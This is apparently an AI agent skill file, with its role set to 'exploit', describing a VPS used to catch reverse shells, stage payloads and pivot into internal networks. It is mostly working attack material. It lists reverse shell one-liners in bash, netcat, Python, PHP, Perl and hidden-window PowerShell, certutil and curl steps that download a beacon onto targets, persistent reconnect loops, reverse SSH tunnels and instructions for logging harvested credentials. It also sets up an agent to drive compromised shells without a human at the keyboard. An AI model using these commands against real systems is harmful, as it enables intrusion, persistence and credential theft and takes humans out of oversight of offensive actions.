---
name: vps-reverse-shell
description: "Leverage self-hosted VPS (<YOUR_VPS_IP>, SSH private key auth) as reverse shell handler and pivot: 9000-9999 listener pool, non-interactive session automation, payload staging, and reverse tunneling"
whenToUse: "When targets cannot reach the operator machine directly, when a static public listening IP is required, for persistent pivot infrastructure, or to allow autonomous agent execution via reverse shells"
role: exploit
enabled: true
---

# VPS Relay & Reverse Shell Management (<YOUR_VPS_IP>)

Self-hosted public VPS acting as **reverse shell landing point + payload staging server + intranet pivot jump box**.
Targets with outbound internet connectivity trigger callbacks to VPS ports `9000-9999`; the agent manages tmux sessions **non-interactively** to issue commands and capture output.

## When to Use / When to Skip

| Scenario | Operational Choice |
| --- | --- |
| Target can reach operator machine directly (same subnet, public IP) | Listen directly on local host; **VPS not required** |
| Target has outbound internet access; operator host is behind NAT | Use VPS (primary operational model) |
| Target is a container/cloud VM with restricted egress (80/443 only) | Use VPS on 9000-9999 (or adapt to 443/80; see troubleshooting) |
| Only need single command output | Prefer Web RCE / HTTP channels (cleaner and more stealthy than full reverse shells) |

## Assets & Credentials

```
Host        : <YOUR_VPS_IP> (Ubuntu 24.04, hostname <VPS_HOSTNAME>)
User        : ubuntu (passwordless sudo)
Private Key : ~/.dsh/redteam/toolkit/vps/id_rsa          <- Permissions 600; never commit or leak
Ports       : 9000-9999                                   <- Cloud security group ingress permitted
Script      : ~/.dsh/redteam/toolkit/vps/vps.sh
```

**Key Security**: Maintain private keys strictly at the configured path. Under no circumstances should private key contents be pasted into skill files, reports, repositories, or chat contexts.

Pre-existing static services: **9001 / 9007 / 9009 (and temporary service ports like 9008)**, along with persistent tmux sessions `cap / sh / up / www`.
**These do not belong to the current engagement; do not kill or overwrite them.**

## Quick Start

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # Inspect VPS status, free ports, active sessions
$VPS listen                 # Automatically pick an available port and start listener ($VPS listen 9000)
# -> Once port is allocated, trigger reverse shell command on target (see below)
$VPS send 9000 'id; uname -a'      # Send commands into active reverse shell session
$VPS read 9000 60                  # Read back output (last 60 lines)
$VPS kill 9000                     # Clean up and release port upon completion
```

`listen` leverages tmux + rlwrap with an **automatic re-listening loop**: if a connection drops, it automatically re-binds to catch reconnects.

## Utility Commands (`vps.sh`)

| Command | Purpose |
| --- | --- |
| `status` | VPS identity, system resources, toolkit status, 9000-9999 port usage, tmux sessions |
| `port` | Automatically returns an available port within 9000-9999 |
| `listen [port]` | Start persistent listener (auto-selects port if omitted), prints target command templates |
| `sessions` | Lists active tmux sessions on the VPS |
| `send <port> '<cmd>'` | **Dispatches command into an active reverse shell** (primary agent tool) |
| `read <port> [lines]` | Reads recent output from session (defaults to 200 lines) |
| `watch <port>` | Live stream session output |
| `attach <port>` | Attach to tmux session directly (`Ctrl-B D` to detach) |
| `kill <port>` | Terminates listener, closes session, releases port |
| `serve [port] [dir]` | Starts HTTP payload server on VPS (defaults to port 9008) |
| `push <local> [remote]` | Upload file to VPS |
| `get <remote> [local]` | Download file from VPS to local operator machine |
| `sh '<cmd>'` | Execute arbitrary command directly on VPS |

Environment overrides: `VPS_HOST`, `VPS_KEY`.

## Target-Side Reverse Shell Payloads (Replace Port with Allocated Port)

```bash
# Bash (Most common)
bash -c 'bash -i >& /dev/tcp/<YOUR_VPS_IP>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<YOUR_VPS_IP>/9000 <&1'

# nc (Traditional netcat with -e support)
nc <YOUR_VPS_IP> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <YOUR_VPS_IP> 9000 > /tmp/f

# Python (Fallback when nc is absent; Python 2/3 compatible)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_VPS_IP>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$s=fsockopen("<YOUR_VPS_IP>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<YOUR_VPS_IP>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<YOUR_VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL Encoding**: When triggering payloads via web application vulnerabilities (command injection / RCE), URL-encode the payload string to prevent truncation by `&` and `>`.

## Session Stabilization & TTY Spawning

Basic `nc` shells lack a full TTY: commands like `sudo`, `su`, `vi`, and `top` will fail. Upgrade via:

```bash
# Execute on target (Python 3 is most reliable)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Or
script -qc /bin/bash /dev/null
```

```bash
# In an attached terminal to restore raw mode and cursor controls:
# Inside shell: press Ctrl-Z
stty raw -echo; fg
# Press enter twice, then:
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**Alternative: socat full TTY listener** (pre-installed on VPS):

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_VPS_IP>:9000
```

Automatic reconnection loop on target:

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<YOUR_VPS_IP>/9000 0>&1'; sleep 10; done &
```

## Payload Delivery (Staging Files on VPS)

```bash
$VPS serve 9100 ~/rt/payloads        # Start HTTP payload server on VPS
$VPS push ./suo5 /home/ubuntu/rt/payloads/

# Target side (Linux)
curl -O http://<YOUR_VPS_IP>:9100/suo5  # Or: wget http://<YOUR_VPS_IP>:9100/suo5

# Target side (Windows)
certutil -urlcache -split -f http://<YOUR_VPS_IP>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<YOUR_VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**Retrieve Loot**: `$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<target>/runs/`

## Reverse Tunnels & Pivoting

When targets reside in internal subnets unreachable from the operator:

```bash
# Reverse SSH tunnel: VPS:9200 -> Target internal 10.0.0.5:8080 (executed on target)
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <key_on_target> ubuntu@<YOUR_VPS_IP>
# Access from operator machine via VPS: ssh -L 8080:127.0.0.1:9200 ubuntu@<YOUR_VPS_IP>

# socat port forward (on VPS)
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

WebShell integration: deploy the suo5 client on the operator machine and the server component on the target; proxying through the VPS stabilizes connections.

## Operational Discipline

1. **Port Allocation**: Restrict activity strictly to 9000-9999. Use `$VPS port` or `$VPS status` to locate free ports; **never interfere with ports 9001, 9007, 9009 or existing tmux sessions `cap/sh/up/www`**.
2. **Post-Op Cleanup**: Always execute `$VPS kill <port>` after completing tasks to release listening sockets and eliminate stray processes.
3. **Store Credentials Locally**: Passwords and hashes extracted on target hosts must be ingested into the local asset ledger via `redteam_credential_add` (plaintext in `secret_value`); output files belong in local `runs/`. **Do not store credentials in the VPS user home directory**.
4. **VPS IP Visibility**: The VPS IP is visible in target connection logs; avoid placing unnecessary personal artifacts on target file systems.
5. **Ledger Ingestion**: Log acquired access via `redteam_access_add` (host, user, method, privileges, session reference); log credentials via `redteam_credential_add`.
6. **Capture Output Verification**: Ensure all commands dispatched via `send` have corresponding output captured via `read`; redirect large outputs to files and retrieve via `get` to avoid tmux buffer truncation.

## Troubleshooting

| Symptom | Resolution |
| --- | --- |
| Target callback fails | Verify listener is active: `$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`; verify target egress (test with `curl -s http://<YOUR_VPS_IP>:<port>` from target) |
| Port outside permitted range | Cloud security group permits only 9000-9999; other ports will fail |
| Session drops repeatedly | Wrap target payload in a `while true` loop; or deploy socat full TTY listener |
| Target executes command but produces no output | Payload was truncated by URL delimiters (`&` / `>`); URL-encode full command string |
| Garbled text output | Set `export LANG=C.UTF-8` on target, or enable UTF-8 in tmux: `tmux set -t rt-<port> utf8 on` |
| No TTY / `sudo` fails | Spawn a PTY shell (see above) |
| Local port check reports all ports open | Local NAT gateway returns synthetic SYN-ACK; verify port accessibility from external nodes |

## Related Skills

- `suo5-tunnel`: WebShell -> SOCKS5 proxy, with traffic egress through VPS
- `webshell-toolkit`: WebShell management via Behinder, Godzilla, and AntSword
- `cn-proxy-pool`: Tunnel egress routing through regional proxies
- `active-scan` / `fofa-recon`: Resuming reconnaissance across discovered internal subnets
